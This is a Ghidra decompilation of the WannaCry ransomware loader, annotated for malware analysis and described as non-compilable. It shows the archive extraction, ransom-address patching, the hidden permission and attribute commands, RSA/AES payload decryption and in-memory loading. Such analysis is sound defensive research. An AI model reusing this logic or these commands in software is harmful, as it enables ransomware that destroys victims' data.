/*
 * Ghidra decompilation with analysis-oriented symbol renaming.
 *
 * SAMPLE SHA-256:
 *   ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa
 *
 * IMPORTANT:
 *   - This is NOT recovered original source code.
 *   - It is NOT expected to compile.
 *   - Function prototypes, class layouts, varargs, calling conventions and
 *     local-variable boundaries may still be wrong because they came from a
 *     decompiler.
 *   - Names marked "Probable" or documented as medium confidence are hypotheses.
 *   - The file is retained as a traceable bridge between Ghidra addresses and
 *     the readable reconstruction in wannacry_loader_reconstructed.c.
 */
...
undefined kRegistryValueName_wd;
undefined *PTR_Rsrc_XIA_80a_409[2096999]_0040e034;
undefined4 kRegistryPrefix_Software;
WCHAR DAT_0040f874;
pointer PTR_FUN_004081d8;
void *ExceptionList;
undefined *DAT_0040f880;
undefined *kTwnryInitializationVector;
...
string kApi_CloseHandle;
string kApi_DeleteFileW;
string kApi_MoveFileExW;
string kApi_MoveFileW;
string kApi_ReadFile;
string kApi_WriteFile;
string kApi_CreateFileW;
string s_kernel32.dll_0040ebe8;
pointer PTR_FUN_004081ec;
undefined *DAT_0040f894;
undefined *DAT_0040f898;
undefined kEmbeddedRsaPrivateKeyBlob;
...
string kApi_CryptGenKey;
string kApi_CryptDecrypt;
string kApi_CryptEncrypt;
string kApi_CryptDestroyKey;
string kApi_CryptImportKey;
string kApi_CryptAcquireContextA;
undefined gHostDerivedName;
string s_cmd.exe_/c_"%s"_0040f42c;
undefined kResourceType_XIA;
string kBitcoinAddress1;
string kBitcoinAddress2;
string kBitcoinAddress3;
undefined DAT_0040f4ac;
string s_Global\MsWinZonesCacheCounterMut_0040f4b4;
CHAR DAT_0040f910;
string s_tasksche.exe_0040f4d8;
string kPayloadExportName_TaskStart;
string s_t.wnry_0040f4f4;
string s_icacls_._/grant_Everyone:F_/T_/C_0040f4fc;
string s_attrib_+h_._0040f520;
string s_WNcry@2ol7_0040f52c;
undefined kInstallSwitch_ProbableSlashI;
undefined LAB_0040216e;
undefined LAB_00402185;
undefined LAB_00402198;
undefined LAB_004021a3;
undefined LAB_004021b2;
string kApi_GetNativeSystemInfo;
...
undefined DAT_0040ce6c;
undefined DAT_0040cee8;
undefined DAT_0040cf64;
undefined DAT_0040cfdc;
...
undefined DAT_0040f818;
undefined DAT_0040f81c;
undefined DAT_0040f820;
undefined DAT_0040f828;
undefined DAT_0040f830;
undefined DAT_0040f838;
undefined DAT_0040f840;
...
bool TransferConfigFile_00401000(void *param_1,int param_2)

{
  ...
  _File = fopen(kConfigFilename_c_wnry,_Mode);
  if (_File == (FILE *)0x0) {
    bVar2 = false;
  }
  else {
...
undefined4 RunHiddenProcess_00401064(LPSTR param_1,DWORD param_2,LPDWORD param_3)
...
undefined4 RegistryWorkingDirectory_004010FD(int param_1)

{
  ...
  puVar4 = &kRegistryPrefix_Software;
  pwVar5 = local_d8;
  ...
  *(undefined1 *)((int)puVar4 + 2) = 0;
  wcscat(local_d8,(wchar_t *)&kRegistrySubkey_WanaCrypt0r);
  local_c = 0;
  do {
    if (local_c == 0) {
    ...
    if (local_8 != (HKEY)0x0) {
      if (param_1 == 0) {
        local_10 = 0x207;
        LVar2 = RegQueryValueExA(local_8,&kRegistryValueName_wd,(LPDWORD)0x0,(LPDWORD)0x0,&local_2e0,
                                 &local_10);
        bVar6 = LVar2 == 0;
        if (bVar6) {
        ...
        LVar2 = RegSetValueExA(local_8,&kRegistryValueName_wd,0,1,&local_2e0,sVar1 + 1);
        bVar6 = LVar2 == 0;
      }
      RegCloseKey(local_8);
      if (bVar6) {
...
void GenerateHostDerivedName_00401225(int param_1)
...
undefined4 * PayloadCryptoContext_Construct_004012FD(void)

{
  ...
  *(undefined4 **)(unaff_EBP + -0x10) = extraout_ECX;
  CryptoKeyContext_Construct_004017DD();
  *(undefined4 *)(unaff_EBP + -4) = 0;
  CryptoKeyContext_Construct_004017DD();
  *(undefined1 *)(unaff_EBP + -4) = 1;
  RijndaelContext_Construct_00402A46();
...
void * __thiscall PayloadCryptoContext_DeletingDestructor_0040135E(void *param_1,byte param_2)

{
  PayloadCryptoContext_Destruct_0040137A();
  if ((param_2 & 1) != 0) {
...
void PayloadCryptoContext_Destruct_0040137A(void)

{
  ...
  *(undefined4 *)(unaff_EBP + -4) = 2;
  SecureWipePayloadBuffers_004013CE();
  *(undefined1 *)(unaff_EBP + -4) = 1;
  RijndaelContext_Destruct_00402A6F();
  *(undefined1 *)(unaff_EBP + -4) = 0;
  CryptoKeyContext_Destruct_0040181B();
...
undefined4 __fastcall SecureWipePayloadBuffers_004013CE(int param_1)

{
  ...
  ReleaseCryptoKeyContext_004018B9();
  ReleaseCryptoKeyContext_004018B9();
...
undefined4 __thiscall InitializePayloadCryptoContext_00401437(int param_1,int param_2,undefined4 param_3,undefined4 param_4)

{
  int iVar1;
  HGLOBAL pvVar2;
  
  iVar1 = ImportRsaPrivateKey_00401861(param_2);
  if (iVar1 != 0) {
    if (param_2 != 0) {
      ImportRsaPrivateKey_00401861(0);
    }
    pvVar2 = GlobalAlloc(0,0x100000);
    *(HGLOBAL *)(param_1 + 0x4c8) = pvVar2;
    if (pvVar2 != (HGLOBAL)0x0) {
      pvVar2 = GlobalAlloc(0,0x100000);
      *(HGLOBAL *)(param_1 + 0x4cc) = pvVar2;
      if (pvVar2 != (HGLOBAL)0x0) {
        *(undefined4 *)(param_1 + 0x4d4) = param_3;
...
HGLOBAL __thiscall DecryptTwnryPayload_004014A6(int param_1,LPCSTR param_2,uint *param_3)

{
  ...
  hFile = CreateFileA(param_2,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  if (hFile != (HANDLE)0xffffffff) {
    ...
    if ((local_28.s.HighPart < 1) && ((local_28.s.HighPart < 0 || (local_28.s.LowPart < 0x6400001)))
      ...
      if (iVar2 != 0) {
        iVar2 = memcmp(&local_240,kTwnryMagic_WANACRY,8);
        if (iVar2 == 0) {
          iVar2 = (*DAT_0040f880)(hFile,local_248,4,local_20,0);
          if ((iVar2 != 0) && (local_248[0] == 0x100)) {
            iVar2 = (*DAT_0040f880)(hFile,*(undefined4 *)(param_1 + 0x4c8),0x100,local_20,0);
            if (iVar2 != 0) {
              ...
              if (iVar2 != 0) {
                ...
                if (((iVar2 != 0) && ((int)local_234 < 1)) &&
                  ...
                  iVar2 = RsaDecryptBuffer_004019E1(*(undefined4 *)(param_1 + 0x4c8),local_248[0],local_230,
                                       &local_30);
                  if (iVar2 != 0) {
                    RijndaelInitialize_00402A76(local_230,kTwnryInitializationVector,local_30,0x10);
                    local_2c = GlobalAlloc(0,local_238);
                    if (local_2c != (HGLOBAL)0x0) {
                      iVar2 = (*DAT_0040f880)(hFile,*(undefined4 *)(param_1 + 0x4c8),
                                              local_28.s.LowPart,local_20,0);
                      pvVar1 = local_2c;
                      if (((iVar2 != 0) && (local_20[0] != 0)) &&
                         ((0x7fffffff < local_234 ||
                          (((int)local_234 < 1 && (local_238 <= local_20[0])))))) {
                        RijndaelTransformBuffer_00403A77(*(undefined4 *)(param_1 + 0x4c8),local_2c,local_20[0],1);
                        *param_3 = local_238;
                        pvVar3 = pvVar1;
                      }
                    }
...
undefined4 ResolveRequiredRuntimeAPIs_0040170A(void)

{
  int iVar1;
  HMODULE hModule;
  
  iVar1 = ResolveCryptoApiFunctions_00401A45();
  if (iVar1 != 0) {
    if (DAT_0040f878 != (FARPROC)0x0) {
      return 1;
    }
    hModule = LoadLibraryA(kKernel32Dll);
    if (hModule != (HMODULE)0x0) {
      DAT_0040f878 = GetProcAddress(hModule,kApi_CreateFileW);
      DAT_0040f87c = GetProcAddress(hModule,kApi_WriteFile);
      DAT_0040f880 = GetProcAddress(hModule,kApi_ReadFile);
      DAT_0040f884 = GetProcAddress(hModule,kApi_MoveFileW);
      DAT_0040f888 = GetProcAddress(hModule,kApi_MoveFileExW);
      DAT_0040f88c = GetProcAddress(hModule,kApi_DeleteFileW);
      _DAT_0040f890 = GetProcAddress(hModule,kApi_CloseHandle);
...
undefined4 * __fastcall CryptoKeyContext_Construct_004017DD(undefined4 *param_1)
...
void * __thiscall CryptoKeyContext_DeletingDestructor_004017FF(void *param_1,byte param_2)
...
void __fastcall CryptoKeyContext_Destruct_0040181B(undefined4 *param_1)
...
undefined4 __fastcall AcquireRsaAesProvider_0040182C(int param_1)
...
undefined4 __thiscall ImportRsaPrivateKey_00401861(int param_1,int param_2)

{
  int iVar1;
  
  iVar1 = AcquireRsaAesProvider_0040182C();
  if (iVar1 != 0) {
    if (param_2 == 0) {
      iVar1 = (*DAT_0040f898)(*(undefined4 *)(param_1 + 4),&kEmbeddedRsaPrivateKeyBlob,0x494,0,0,param_1 + 8);
    }
    else {
      iVar1 = ImportRsaKeyFromFile_004018F9(*(undefined4 *)(param_1 + 4),param_1 + 8,param_2);
    }
    if (iVar1 != 0) {
      return 1;
    }
...
undefined4 __fastcall ReleaseCryptoKeyContext_004018B9(int param_1)
...
undefined4 ImportRsaKeyFromFile_004018F9(undefined4 param_1,undefined4 param_2,LPCSTR param_3)
...
RsaDecryptBuffer_004019E1(int param_1,void *param_2,size_t param_3,void *param_4,size_t *param_5)

{
  ...
  if (*(int *)(param_1 + 8) != 0) {
    ...
    iVar1 = (*DAT_0040f8a4)(*(undefined4 *)(param_1 + 8),0,1,0,param_2,&param_3);
    if (iVar1 != 0) {
...
undefined4 ResolveCryptoApiFunctions_00401A45(void)

{
  ...
  if (DAT_0040f894 == (FARPROC)0x0) {
    hModule = LoadLibraryA(kAdvapi32Dll);
    if (hModule != (HMODULE)0x0) {
      DAT_0040f894 = GetProcAddress(hModule,kApi_CryptAcquireContextA);
      DAT_0040f898 = GetProcAddress(hModule,kApi_CryptImportKey);
      DAT_0040f89c = GetProcAddress(hModule,kApi_CryptDestroyKey);
      DAT_0040f8a0 = GetProcAddress(hModule,kApi_CryptEncrypt);
      DAT_0040f8a4 = GetProcAddress(hModule,kApi_CryptDecrypt);
      _DAT_0040f8a8 = GetProcAddress(hModule,kApi_CryptGenKey);
...
undefined4 TryCreateWorkingDirectory_00401AF6(LPCWSTR param_1,LPCWSTR param_2,wchar_t *param_3)
...
bool SelectInstallationDirectory_00401B5F(void)

{
  ...
  *(undefined2 *)puVar4 = 0;
  MultiByteToWideChar(0,0,&gHostDerivedName,-1,&local_cc,99);
  ...
  if ((DVar1 == 0xffffffff) || (iVar3 = TryCreateWorkingDirectory_00401AF6(&local_2d4,&local_cc), iVar3 == 0)) {
    swprintf(&local_2d4,0x40f3f8,(wchar_t *)&stack0xfffffb24);
    iVar3 = TryCreateWorkingDirectory_00401AF6(&local_2d4,&local_cc);
    if ((iVar3 == 0) && (iVar3 = TryCreateWorkingDirectory_00401AF6(), iVar3 == 0)) {
      ...
      iVar3 = TryCreateWorkingDirectory_00401AF6();
      return iVar3 != 0;
    }
  }
  return true;
...
undefined4 InstallAndStartService_00401CE8(undefined4 param_1)

{
  ...
  if (local_8 == (SC_HANDLE)0x0) {
    ...
    local_10 = OpenServiceA(local_8,&gHostDerivedName,0xf01ff);
    if (local_10 == (SC_HANDLE)0x0) {
      sprintf(local_410,kServiceCommandFormat,param_1);
      hService = CreateServiceA(local_8,&gHostDerivedName,&gHostDerivedName,0xf01ff,0x10,2,1,local_410,
...
undefined4 ExtractEmbeddedResourceArchive_00401DAB(HMODULE param_1,undefined4 param_2)

{
  ...
  hResInfo = FindResourceA(param_1,(LPCSTR)0x80a,&kResourceType_XIA);
  if (((hResInfo != (HRSRC)0x0) &&
    ...
    iVar3 = OpenEmbeddedZipArchive_004075AD(pvVar1,DVar2,param_2);
    if (iVar3 != 0) {
      local_130 = 0;
      pcVar6 = local_12c;
      ...
      QueryEmbeddedZipEntry_004075C4(iVar3,0xffffffff,&local_130);
      iVar5 = local_130;
      iVar7 = 0;
      if (0 < local_130) {
        do {
          QueryEmbeddedZipEntry_004075C4(iVar3,iVar7,&local_130);
          iVar4 = strcmp(local_12c,kConfigFilename_c_wnry);
          if ((iVar4 != 0) || (DVar2 = GetFileAttributesA(local_12c), DVar2 == 0xffffffff)) {
            ExtractEmbeddedZipEntryToDisk_0040763D(iVar3,iVar7,local_12c);
          }
          iVar7 = iVar7 + 1;
        } while (iVar7 < iVar5);
      }
      CloseEmbeddedZipArchive_00407656(iVar3);
      return 1;
    }
  }
  return 0;
...
void PatchConfigWithBitcoinAddress_00401E9E(void)

{
  ...
  local_10[0] = kBitcoinAddress3;
  local_10[1] = kBitcoinAddress2;
  local_10[2] = kBitcoinAddress1;
  iVar1 = TransferConfigFile_00401000(local_31c,1);
  if (iVar1 != 0) {
    iVar1 = rand();
    strcpy(local_26a,local_10[iVar1 % 3]);
    TransferConfigFile_00401000(local_31c,0);
  }
  return;
}
...
undefined4 WaitForInitializationMutex_00401EFF(int param_1)

{
  ...
  sprintf(local_68,&DAT_0040f4ac,kMutexBaseName,0);
  iVar1 = 0;
  if (0 < param_1) {
    do {
...
undefined4 StartInstalledCopy_00401F5D(void)

{
  ...
  *(undefined1 *)((int)puVar2 + 2) = 0;
  GetFullPathNameA(kInstalledExecutableName,0x208,&local_20c,(LPSTR *)0x0);
  iVar1 = InstallAndStartService_00401CE8(&local_20c);
  if ((iVar1 != 0) && (iVar1 = WaitForInitializationMutex_00401EFF(0x3c), iVar1 != 0)) {
    return 1;
  }
  iVar1 = RunHiddenProcess_00401064(&local_20c,0,0);
  if ((iVar1 != 0) && (iVar1 = WaitForInitializationMutex_00401EFF(0x3c), iVar1 != 0)) {
    return 1;
  }
  return 0;
...
undefined4 WannaCryLoaderMain_00401FE7(void)

{
  ...
  *(undefined1 *)((int)puVar5 + 2) = 0;
  ...
  GenerateHostDerivedName_00401225(&gHostDerivedName);
  piVar1 = (int *)__p___argc();
  if (*piVar1 == 2) {
    pcVar6 = &kInstallSwitch_ProbableSlashI;
    piVar1 = (int *)__p___argv();
    iVar4 = strcmp(*(char **)(*piVar1 + 4),pcVar6);
    if ((iVar4 == 0) && (iVar4 = SelectInstallationDirectory_00401B5F(0), iVar4 != 0)) {
      CopyFileA(&local_210,kInstalledExecutableName,0);
      DVar2 = GetFileAttributesA(kInstalledExecutableName);
      if ((DVar2 != 0xffffffff) && (iVar4 = StartInstalledCopy_00401F5D(), iVar4 != 0)) {
        return 0;
      }
    }
  }
  ...
  RegistryWorkingDirectory_004010FD(1);
  ExtractEmbeddedResourceArchive_00401DAB(0,kEmbeddedZipPassword);
  PatchConfigWithBitcoinAddress_00401E9E();
  RunHiddenProcess_00401064(kHideCurrentDirectoryCommand,0,0);
  RunHiddenProcess_00401064(kGrantEveryoneFullControlCommand,0,0);
  iVar4 = ResolveRequiredRuntimeAPIs_0040170A();
  if (iVar4 != 0) {
    PayloadCryptoContext_Construct_004012FD();
    iVar4 = InitializePayloadCryptoContext_00401437(0,0,0);
    if (iVar4 != 0) {
      local_8 = 0;
      iVar4 = DecryptTwnryPayload_004014A6(kEncryptedPayloadFilename_t_wnry,&local_8);
      if (((iVar4 != 0) && (iVar4 = MemoryLoadLibrary_004021BD(iVar4,local_8), iVar4 != 0)) &&
         (pcVar3 = (code *)MemoryGetProcAddress_00402924(iVar4,kPayloadExportName_TaskStart), pcVar3 != (code *)0x0)) {
        (*pcVar3)(0,0);
      }
    }
    PayloadCryptoContext_Destruct_0040137A();
...
void MemoryLoadLibrary_004021BD(undefined4 param_1,undefined4 param_2)

{
  MemoryLoadLibraryEx_004021E9(param_1,param_2,&LAB_0040216e,&LAB_00402185,&LAB_00402198,&LAB_004021a3,&LAB_004021b2
               ,0);
  return;
}
...
int * MemoryLoadLibraryEx_004021E9(short *param_1,undefined4 param_2,code *param_3,code *param_4,int param_5,
...

{
  ...
  local_8 = 0;
  iVar2 = CheckInputBufferSize_00402457(param_2,0x40);
  if (iVar2 == 0) {
    return (int *)0x0;
  }
  if (*param_1 == 0x5a4d) {
    iVar2 = CheckInputBufferSize_00402457(param_2,*(int *)(param_1 + 0x1e) + 0xf8);
    if (iVar2 == 0) {
      return (int *)0x0;
    }
    ...
    if (((*piVar8 == 0x4550) && ((short)piVar8[1] == 0x14c)) && ((piVar8[0xe] & 1U) == 0)) {
      ...
      pHVar3 = GetModuleHandleA(kKernel32Dll);
      if (pHVar3 == (HMODULE)0x0) {
        return (int *)0x0;
      }
      pcVar4 = (code *)(*param_6)(pHVar3,kApi_GetNativeSystemInfo,0);
      if (pcVar4 == (code *)0x0) {
        return (int *)0x0;
      }
      (*pcVar4)(local_2c);
      ...
      if (uVar7 == (local_28 + -1 + local_8 & ~(local_28 - 1U))) {
        ...
        if ((iVar2 != 0) || (iVar2 = (*param_3)(0,uVar7,0x3000,4,param_8), iVar2 != 0)) {
          ...
          piVar5 = HeapAlloc(hHeap,DVar9,dwBytes);
          if (piVar5 != (int *)0x0) {
            piVar5[1] = iVar2;
            piVar5[5] = (*(ushort *)((int)piVar8 + 0x16) & 0x2000) >> 0xd;
            ...
            piVar5[0xc] = param_8;
            piVar5[0xe] = local_28;
            iVar6 = CheckInputBufferSize_00402457(param_2,piVar8[0x15]);
            if (iVar6 != 0) {
              ...
              *(int *)(iVar6 + (int)_Dst + 0x34) = iVar2;
              iVar6 = MemoryCopySections_00402470(param_1,param_2,piVar8,piVar5);
              if (iVar6 != 0) {
                ...
                if (iVar6 == 0) {
                  ...
                  iVar6 = MemoryPerformBaseRelocation_00402758(piVar5,iVar6);
                  piVar5[6] = iVar6;
                }
                iVar6 = MemoryBuildImportTable_004027DF(piVar5);
                if (((iVar6 != 0) && (iVar6 = MemoryFinalizeSections_0040254B(piVar5), iVar6 != 0)) &&
                   (iVar6 = MemoryExecuteTlsCallbacks_0040271D(piVar5), iVar6 != 0)) {
            ...
            MemoryFreeLibrary_004029CC(piVar5);
            return (int *)0x0;
          }
...
undefined4 CheckInputBufferSize_00402457(uint param_1,uint param_2)
...
undefined4 MemoryCopySections_00402470(int param_1,undefined4 param_2,int param_3,int *param_4)
  ...
  if (*(short *)(iVar4 + 6) != 0) {
    do {
      ...
      if (*psVar5 == 0) {
        ...
        iVar4 = CheckInputBufferSize_00402457(param_2,psVar1[0xb] + *psVar5);
        if ((iVar4 == 0) ||
...
bool MemoryFinalizeSections_0040254B(int *param_1)

{
  ...
  local_18 = MemoryGetSectionSize_0040264F(param_1,iVar3);
  ...
  if (1 < *(ushort *)(iVar2 + 6)) {
    do {
      ...
      local_c = MemoryGetSectionSize_0040264F(piVar1,iVar3 + 0x28);
      if ((local_1c == uVar4) || (uVar4 < local_18 + local_20)) {
        ...
        iVar2 = MemoryFinalizeSection_0040267B(piVar1,&local_20);
        if (iVar2 == 0) {
          return false;
        }
        local_20 = local_8;
  ...
  local_10 = 1;
  iVar3 = MemoryFinalizeSection_0040267B(piVar1,&local_20);
  return iVar3 != 0;
}



int MemoryGetSectionSize_0040264F(int *param_1,int param_2)
...
bool MemoryFinalizeSection_0040267B(int *param_1,int *param_2)
...
undefined4 MemoryExecuteTlsCallbacks_0040271D(int *param_1)
...
bool MemoryPerformBaseRelocation_00402758(int *param_1,int param_2)
...
int MemoryBuildImportTable_004027DF(uint *param_1)

{
  ...
  if (*(int *)(*param_1 + 0x84) != 0) {
    ...
    while( true ) {
      ...
      iVar3 = (*(code *)piVar2[9])(lp[3] + iVar1,piVar2[0xc]);
      if (iVar3 == 0) break;
      pvVar4 = realloc((void *)piVar2[2],piVar2[3] * 4 + 4);
      if (pvVar4 == (void *)0x0) {
      ...
      piVar2[2] = (int)pvVar4;
      *(int *)((int)pvVar4 + piVar2[3] * 4) = iVar3;
      piVar2[3] = piVar2[3] + 1;
      if (*lp == 0) {
      ...
      for (; uVar5 = *param_1, uVar5 != 0; param_1 = param_1 + 1) {
        ...
        uVar5 = (*(code *)piVar2[10])(iVar3,uVar5,iVar7);
        *puVar6 = uVar5;
        if (uVar5 == 0) {
          local_c = 0;
          break;
...
int MemoryGetProcAddress_00402924(int *param_1,char *param_2)
...
void MemoryFreeLibrary_004029CC(int *param_1)
...
void __fastcall RijndaelContext_Construct_00402A46(undefined4 *param_1)
...
void * __thiscall RijndaelContext_DeletingDestructor_00402A53(void *param_1,byte param_2)
...
void __fastcall RijndaelContext_Destruct_00402A6F(undefined4 *param_1)
...
void __thiscall RijndaelInitialize_00402A76(int param_1,byte *param_2,uint *param_3,int param_4,byte *param_5)

{
  ...
  if (param_2 == (byte *)0x0) {
    param_3 = (uint *)&DAT_0040f57c;
    exception::exception(local_18,(char **)&param_3);
...
LAB_00402b9a:
  ...
  if (-1 < *(int *)(param_1 + 0x410)) {
    ...
    do {
      ...
      iVar9 = iVar9 + 1;
      puVar8 = puVar8 + 8;
    } while (iVar9 <= *(int *)(param_1 + 0x410));
  }
  iVar9 = 0;
  if (-1 < *(int *)(param_1 + 0x410)) {
    puVar8 = (undefined4 *)(param_1 + 0x1e8);
    do {
      iVar5 = iVar3;
      puVar11 = puVar8;
      if (0 < iVar3) {
  ...
  pcVar4 = (char *)(*(int *)(param_1 + 0x3c8) / 4);
  iVar9 = (*(int *)(param_1 + 0x410) + 1) * iVar3;
  puVar6 = (uint *)(param_1 + 0x414);
  param_3 = (uint *)pcVar4;
  if (0 < (int)pcVar4) {
    do {
      *puVar6 = (uint)*param_2 << 0x18;
      *puVar6 = *puVar6 | (uint)param_2[1] << 0x10;
      *puVar6 = *puVar6 | (uint)param_2[2] << 8;
      *puVar6 = *puVar6 | (uint)param_2[3];
      param_2 = param_2 + 4;
      puVar6 = puVar6 + 1;
  ...
  param_3 = (uint *)0x0;
  if (0 < (int)pcVar4) {
    puVar8 = (undefined4 *)(param_1 + 0x414);
    do {
      if (iVar9 <= (int)param_3) goto LAB_00402e04;
      iVar5 = (int)param_3 / iVar3;
      iVar10 = (int)param_3 % iVar3;
      *(undefined4 *)(param_1 + 8 + (iVar10 + iVar5 * 8) * 4) = *puVar8;
      param_3 = (uint *)((int)param_3 + 1);
      uVar1 = *puVar8;
      puVar8 = puVar8 + 1;
      *(undefined4 *)(param_1 + 0x1e8 + (iVar10 + (*(int *)(param_1 + 0x410) - iVar5) * 8) * 4) =
           uVar1;
    } while ((int)param_3 < (int)pcVar4);
  }
  if ((int)param_3 < iVar9) {
    param_5 = &DAT_0040bbfc;
    do {
      uVar2 = *(uint *)(param_1 + 0x410 + (int)pcVar4 * 4);
      *(uint *)(param_1 + 0x414) =
           *(uint *)(param_1 + 0x414) ^
           CONCAT31(CONCAT21(CONCAT11((&DAT_004089fc)[uVar2 >> 0x10 & 0xff] ^ *param_5,
                                      (&DAT_004089fc)[uVar2 >> 8 & 0xff]),
                             (&DAT_004089fc)[uVar2 & 0xff]),(&DAT_004089fc)[uVar2 >> 0x18]);
      param_5 = param_5 + 1;
      if (pcVar4 == (char *)0x8) {
        puVar6 = (uint *)(param_1 + 0x418);
        iVar5 = 3;
        do {
...
void __thiscall RijndaelEncryptBlock128_00402E7E(int param_1,uint *param_2,byte *param_3)

{
  ...
  if (*(char *)(param_1 + 4) != '\0') {
    ...
    *param_3 = (&DAT_004089fc)[local_14 >> 0x18] ^ (byte)((uint)uVar2 >> 0x18);
    param_3[1] = (&DAT_004089fc)[local_10 >> 0x10 & 0xff] ^ (byte)((uint)uVar2 >> 0x10);
    param_3[2] = (&DAT_004089fc)[uVar4 >> 8 & 0xff] ^ (byte)((uint)uVar2 >> 8);
    local_8._0_1_ = (byte)uVar2;
    param_3[3] = (&DAT_004089fc)[local_c & 0xff] ^ (byte)local_8;
    uVar2 = *(undefined4 *)(param_1 + 4);
    param_3[4] = (&DAT_004089fc)[local_10 >> 0x18] ^ (byte)((uint)uVar2 >> 0x18);
    param_3[5] = (&DAT_004089fc)[uVar4 >> 0x10 & 0xff] ^ (byte)((uint)uVar2 >> 0x10);
    param_3[6] = (&DAT_004089fc)[local_c >> 8 & 0xff] ^ (byte)((uint)uVar2 >> 8);
    local_8._0_1_ = (byte)uVar2;
    param_3[7] = (&DAT_004089fc)[local_14 & 0xff] ^ (byte)local_8;
    uVar2 = *(undefined4 *)(param_1 + 8);
    param_3[8] = (&DAT_004089fc)[uVar4 >> 0x18] ^ (byte)((uint)uVar2 >> 0x18);
    param_3[9] = (&DAT_004089fc)[local_c >> 0x10 & 0xff] ^ (byte)((uint)uVar2 >> 0x10);
    param_3[10] = (&DAT_004089fc)[local_14 >> 8 & 0xff] ^ (byte)((uint)uVar2 >> 8);
    local_8._0_1_ = (byte)uVar2;
    param_3[0xb] = (&DAT_004089fc)[local_10 & 0xff] ^ (byte)local_8;
    uVar2 = *(undefined4 *)(param_1 + 0xc);
    param_3[0xc] = (&DAT_004089fc)[local_c >> 0x18] ^ (byte)((uint)uVar2 >> 0x18);
    param_3[0xd] = (&DAT_004089fc)[local_14 >> 0x10 & 0xff] ^ (byte)((uint)uVar2 >> 0x10);
    param_3[0xe] = (&DAT_004089fc)[local_10 >> 8 & 0xff] ^ (byte)((uint)uVar2 >> 8);
    local_8._0_1_ = (byte)uVar2;
    param_3[0xf] = (&DAT_004089fc)[uVar4 & 0xff] ^ (byte)local_8;
    return;
  }
  local_20 = param_1;
...
void __thiscall RijndaelDecryptBlock128_004031BC(int param_1,byte *param_2,byte *param_3)

{
  ...
  if (*(char *)(param_1 + 4) != '\0') {
    ...
    *param_3 = (&DAT_00408afc)[uVar4 >> 0x18] ^ (byte)((uint)uVar2 >> 0x18);
    param_3[1] = (&DAT_00408afc)[local_c >> 0x10 & 0xff] ^ (byte)((uint)uVar2 >> 0x10);
    param_3[2] = (&DAT_00408afc)[local_10 >> 8 & 0xff] ^ (byte)((uint)uVar2 >> 8);
    local_8._0_1_ = (byte)uVar2;
    param_3[3] = (&DAT_00408afc)[local_14 & 0xff] ^ (byte)local_8;
    uVar2 = *(undefined4 *)(param_1 + 4);
    param_3[4] = (&DAT_00408afc)[local_14 >> 0x18] ^ (byte)((uint)uVar2 >> 0x18);
    param_3[5] = (&DAT_00408afc)[uVar4 >> 0x10 & 0xff] ^ (byte)((uint)uVar2 >> 0x10);
    param_3[6] = (&DAT_00408afc)[local_c >> 8 & 0xff] ^ (byte)((uint)uVar2 >> 8);
    local_8._0_1_ = (byte)uVar2;
    param_3[7] = (&DAT_00408afc)[local_10 & 0xff] ^ (byte)local_8;
    uVar2 = *(undefined4 *)(param_1 + 8);
    param_3[8] = (&DAT_00408afc)[local_10 >> 0x18] ^ (byte)((uint)uVar2 >> 0x18);
    param_3[9] = (&DAT_00408afc)[local_14 >> 0x10 & 0xff] ^ (byte)((uint)uVar2 >> 0x10);
    param_3[10] = (&DAT_00408afc)[uVar4 >> 8 & 0xff] ^ (byte)((uint)uVar2 >> 8);
    local_8._0_1_ = (byte)uVar2;
    param_3[0xb] = (&DAT_00408afc)[local_c & 0xff] ^ (byte)local_8;
    uVar2 = *(undefined4 *)(param_1 + 0xc);
    param_3[0xc] = (&DAT_00408afc)[local_c >> 0x18] ^ (byte)((uint)uVar2 >> 0x18);
    param_3[0xd] = (&DAT_00408afc)[local_10 >> 0x10 & 0xff] ^ (byte)((uint)uVar2 >> 0x10);
    param_3[0xe] = (&DAT_00408afc)[local_14 >> 8 & 0xff] ^ (byte)((uint)uVar2 >> 8);
    local_8._0_1_ = (byte)uVar2;
    param_3[0xf] = (&DAT_00408afc)[uVar4 & 0xff] ^ (byte)local_8;
    return;
  }
  local_20 = param_1;
...
void __thiscall RijndaelEncryptBlock_0040350F(int param_1,byte *param_2,byte *param_3)

{
  ...
  if (*(int *)(param_1 + 0x3cc) == 0x10) {
    RijndaelEncryptBlock128_00402E7E(param_2,param_3);
  }
  else {
    iVar3 = *(int *)(param_1 + 0x3cc) / 4;
        ...
        if (0 < iVar3) {
          ...
          do {
            ...
            *puVar5 = *(uint *)(&DAT_004093fc + local_2c * 4) ^
                      *(uint *)(&DAT_004097fc +
                               (*(uint *)(param_1 + 0x454 + ((local_28 + (int)param_2) % iVar3) * 4)
                               & 0xff) * 4) ^
                      *(uint *)(&DAT_00408ffc +
                               (uint)*(byte *)(param_1 + 0x456 + ((int)param_2 % iVar3) * 4) * 4) ^
                      *(uint *)(&DAT_00408bfc + (uint)*(byte *)((int)puVar5 + 0x23) * 4) ^ *local_8;
            puVar5 = puVar5 + 1;
            param_2 = (byte *)((int)param_2 + 1);
            local_14 = local_14 + -1;
            local_8 = puVar1;
    ...
    if (0 < iVar3) {
      ...
      do {
        ...
        *pbVar6 = (&DAT_004089fc)[*(byte *)((int)param_3 + 3)] ^ (byte)((uint)uVar2 >> 0x18);
        pbVar6[1] = (&DAT_004089fc)
                    [*(byte *)(param_1 + 0x456 + ((local_1c + local_18) % iVar3) * 4)] ^
                    (byte)((uint)uVar2 >> 0x10);
        pbVar6[2] = (&DAT_004089fc)[*(byte *)(param_1 + 0x455 + (local_18 % iVar3) * 4)] ^
                    (byte)((uint)uVar2 >> 8);
        param_2._0_1_ = (byte)uVar2;
        pbVar6[3] = (&DAT_004089fc)
                    [*(uint *)(param_1 + 0x454 + ((local_20 + local_18) % iVar3) * 4) & 0xff] ^
                    (byte)param_2;
        pbVar6 = pbVar6 + 4;
...
void __thiscall RijndaelDecryptBlock_00403797(int param_1,byte *param_2,byte *param_3)

{
  ...
  if (*(int *)(param_1 + 0x3cc) == 0x10) {
    RijndaelDecryptBlock128_004031BC(param_2,param_3);
  }
  else {
    iVar3 = *(int *)(param_1 + 0x3cc) / 4;
    iVar4 = (-(uint)(iVar3 != 4) & (iVar3 != 6) + 1) * 0x20;
        ...
        if (0 < iVar3) {
          ...
          do {
            ...
            *puVar5 = *(uint *)(&DAT_0040a3fc + local_2c * 4) ^
                      ...
                      *(uint *)(&DAT_00409ffc +
                               (uint)*(byte *)(param_1 + 0x456 + ((int)param_2 % iVar3) * 4) * 4) ^
